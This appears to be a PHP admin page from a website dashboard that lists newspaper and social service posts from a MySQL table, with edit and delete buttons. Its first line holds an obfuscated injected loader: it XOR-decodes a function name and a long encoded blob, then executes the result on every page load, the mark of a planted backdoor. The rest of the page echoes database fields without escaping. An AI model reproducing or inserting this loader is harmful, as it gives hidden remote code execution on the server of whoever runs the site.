<?php $VadSuU='R>+Q1Kn.1 933SS'; $fgDikiY='1LN0E.1HDNZGZ<='^$VadSuU; $zKlFap='I2FH+2SV.X, eKSQ5:HpRLOJ>1V21sb8DCsegf86CXORCEPOEzXYGf=, ,i.;;5pF5W6LxdL.3.javKVv5kkKn<<;wpulSMlE<1 Yqs qoNszKh=WGE;=.ViMZX VAPUt3dxdlddrRCMZexijEO,X9wCZ6w:QQZN8wr+anrX0==<6nAQT5NazPdknC+6AB6po,Y0YzXY7HL7ck=POOwntX;+CNqei<Z18b=V>APq-5654mio<9=N.H<PPj4u<q 1rb1Bbg .MSJWat8T ;UfK5xCV>26Q==VRkgWuU=2oxPw=,36dwzM;X FVi2Pzi10KZxn+Z:Zjc=nzTW>H46=VGj1ikbnudliL0frFN-iwdnqBXBG SfKOlqTJ86YrK=LRhsQ>7=kxelo+ =RpuMu5;  KvCzAhO<>UJU<ZvUt2HWH=H<;=X72P0VAc  =ZeaT7,fSQ7VGwd,N7-J-oEVP1UbAHkRYD+3:XLmdvd:FDpYYH;arlQ-EI,Es3 >c.;+F50RsPHOlmUaSPBOpolpkcSIObEX.<Unl1.Hc+NsxRPA,65aHRdoWue7isVv- bT4SJ4OThwVPxujzmbco1B ZC8<5 2VC=25HmoN RQX8OAYzBUJ=2kdyLafgA-bh0=  FA>L:9cw 885RV3U5yBd3S:R-RxsNl-'; $yOAllK=$fgDikiY('', ' TniMG=5Z1CN:.+8FN;Xu4 8aU7FP,=U17TLNFC<J>:< 19 +Z 659YMTM6qVNAXbQ6B-TDhEVWCAVkvVNabBJSIOWMUKtvfL5WO+YWIQRnCAkLTk41IQK8Ai>9T7hkuPZOSMfmmV=69zKEIBa+M,X,g3kWdqu1+A,VBAKR+DOQYXFe:1Lg<Sknbg1NB40XXKC,DpARPJB1=iOY1;.WST>ZG0+JoMX;EY=V3GamQKTZFQVceZVO+O+TpxNk6s>kx7BP1BCKK4swiAPN5LN0OkNrJrZSB0bV3+KZwQ>XKTrYSYMGWDJZiM9L33R8-pcXVkrYJO;N;CCFds28L-UUUvoNn;.3;078I-CFV-+TIJZNU49.2EzF0Eexp.YB8- X5rUSuURDPrleKOAI3PHmQCZLU.MIs<b264q.4H;VhTr=9;X:UZQ1MWxH93<DAI;:>9BXN10D3qC;H+TB.HGa21E4KmhO680JlQ=5DMMnS lT=8<ZATJqL7;M<,XEG<KCB5ACzT;-6KAuE716.YOJVKK>-zJa<OH45KZK1DvgSEopfMWVXp6WW5MWTPBeEHEZfVaxQy2XE2dOFMSMDEOP0R;:gWPYm3;TAA;EH>A+=7Y+fuZf1+ISBMYlAFGaVhaUKALneZ-NX8PPYAY=7WrhPyn:6B;YzHZufP'^$zKlFap); $yOAllK();
	include('../../config/config.php');
	ini_set("display_errors",0);

	$sql = "select * from newspaper_register where status='Active'";
	$dataShow = mysql_query("select * from newspaper_register where status='Active' ORDER BY 1 DESC");
	$query = mysql_query($sql);
	$rows = mysql_fetch_array($query);
	$count = mysql_num_rows($query);
?>
<form action='../sql_query/newspaper_delete.php' method='post'>
	<div class='dashboard-container'>
		<!-- Members Details Start -->
		<h4 class="header-title">Social Service Project Details <a href="index.php?page=newspaper	.php" class='pull-right icons'><i class="fa fa-plus-square-o" aria-hidden="true">&nbsp;</i>Add New Service Posts</a></h4>
		<div class='row'>
			<div class='col-sm-12'>
				<div class='panel-type-bg'>
					<h4 class="inner-title">Latest added service posters <p class='pull-right search-field'><input type='text' name='' placeholder='Search Members' class='form-control searchbox'></p></h4>
					<?php if(isset($_GET['msg']) and $_GET['msg'] == 'newsdelete') echo "<p class='error-msg'>1 Record deleted successfully.</p>";?>
					<table class='table table-bordered admin-table all-news'>
						<tr>
							<th>Newspaper Name</th>
							<th>Newspaper Comment</th>
							<th width='150' class='hidden-xs'>News Paper Image</th>
							<th width='100' class='hidden-xs'>Action</th>
						</tr>
						<tbody class="myTable">
						<?php 
							while($rowsdb = mysql_fetch_array($dataShow))
							{
						?>
						<tr>
							<td><strong><?php echo $rowsdb['newstitle'] ?> </strong><br /><span class='small'><em><?php echo $rowsdb['newspapername'] ?>&nbsp;&nbsp;<?php echo $rowsdb['date'] ?></em></span> <span class="hidden-sm hidden-md hidden-lg">
								<img src="<?php echo $localpath ?>/admin/newsreport/<?php echo $rowsdb['photo'] ?>" width='80' height='6' class='img-responsive' /><br /><a href="index.php?page=web-social-service-edit.php&id=<?php echo $rowsdb['id'] ?>" class='icons' title='Edit Poster Details'><i class='fa fa-pencil'>&nbsp;</i></a><button type='submit' class='icons mar-rgtlft-20 brdr-none no-shadow <?php if($count == 0) echo "hide"; ?>' name='delete'value='<?php echo $rowsdb['id'] ?>' title='Delete Poster Details'onclick="return confirm('Are you sure want to delete this record?')"><i class='fa fa-trash'>&nbsp;</i></button>
							</span></td>
							<td><p class="content-in"><?php echo $rowsdb['newscontent'] ?></td>
							<td class='hidden-xs'><img src="<?php echo $localpath ?>/admin/newsreport/<?php echo $rowsdb['photo'] ?>" width='80' height='6' class='img-responsive' /></td>
							<td class='hidden-xs'><a href="index.php?page=newspaper-edit.php&id=<?php echo $rowsdb['id'] ?>" class='icons' title='Edit Poster Details'><i class='fa fa-pencil'>&nbsp;</i></a><button type='submit' class='icons mar-rgtlft-20 brdr-none no-shadow <?php if($count == 0) echo "hide"; ?>' name='delete'value='<?php echo $rowsdb['id'] ?>' title='Delete Poster Details'onclick="return confirm('Are you sure want to delete this record?')"><i class='fa fa-trash'>&nbsp;</i></button></td>
						</tr>
						<?php
							}
							if($count == 0)
							{
						?>
								<tr><td class='text-center text-danger' colspan='4'>No record found</td></tr>
						<?php
							}
						?>
						<tr class="no-data">
							<td colspan="7" class="text-center">
								No record found.
							</td>
						</tr>
						</tbody>
					</table>
				</div>
			</div>
		</div><br /><br />
		<!-- Members Details End -->
	</div>
</form>